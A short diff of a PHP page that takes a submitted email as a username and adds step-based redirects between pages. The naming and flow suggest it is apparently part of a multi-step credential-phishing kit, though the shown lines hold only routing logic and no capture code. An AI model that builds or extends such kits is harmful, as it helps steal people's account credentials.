@@ -2,6 +2,11 @@
 include '../settings.php';
 include 'functions.php';
 
+if (!h4z3_is_step_active('email')) {
+    header('Location: ' . h4z3_get_first_step_path('../'));
+    exit;
+}
+
 if ($_SERVER['REQUEST_METHOD'] == 'POST') {
 
     $username = $_POST['email'];
@@ -45,6 +50,8 @@ if ($_SERVER['REQUEST_METHOD'] == 'POST') {
         }
         }
 
-     header('Location: ../Code.php');      
+    $nextStep = h4z3_get_next_step_path('email', '../');
+    header('Location: ' . $nextStep);
+    exit;
 }
 ?>
